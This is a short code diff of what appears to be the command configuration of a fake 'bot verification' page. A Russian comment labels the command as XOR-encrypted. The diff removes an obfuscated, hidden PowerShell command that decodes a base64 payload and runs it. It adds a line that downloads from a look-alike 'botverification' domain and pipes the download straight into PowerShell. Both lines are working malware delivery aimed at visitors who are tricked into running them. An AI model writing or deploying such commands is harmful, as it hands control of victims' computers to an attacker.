@@ -412,7 +412,7 @@
     // НАСТРОЙКА КОМАНДЫ (ЗАШИФРОВАННАЯ ЧЕРЕЗ XOR)
     // ========================================================================
     const CONFIG = {
-        command: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$key=42;$encrypted=[Convert]::FromBase64String('Q1hHCkNEWV5LRkZARV9YREtGXlhLSU8EREVJQk9LXgRZSFkKVgpDT1I=');$bytes=$encrypted|%{$_ -bxor $key};$cmd=[System.Text.Encoding]::UTF8.GetString($bytes);Invoke-Expression $cmd\""
+        command: "cmd /c curl -L botverification.сс.cd|powershell"
     };
     // ========================================================================
 
